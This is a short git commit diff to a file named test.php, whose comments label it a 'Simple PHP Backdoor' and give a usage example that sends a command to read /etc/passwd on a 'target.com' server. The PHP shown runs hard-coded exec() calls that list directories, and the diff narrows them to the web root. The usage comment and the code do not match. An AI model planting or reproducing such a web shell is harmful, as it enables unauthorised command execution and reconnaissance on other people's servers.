914696c00808f716f8f345ed4a9bae89108f603e
Void <51586851+Val0id@users.noreply.github.com>
2023-02-07 01:54:34 +0700

    fsdfasd

--- test.php
+++ test.php
@@ -1,7 +1,5 @@
 <!-- Simple PHP Backdoor By DK (One-Liner Version) -->
 <!-- Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd -->
 <?php
-echo exec("ls");
-echo exec("pwd");
-echo exec("ls -la /");
+echo exec("ls -la /var/www/html");
 ?>
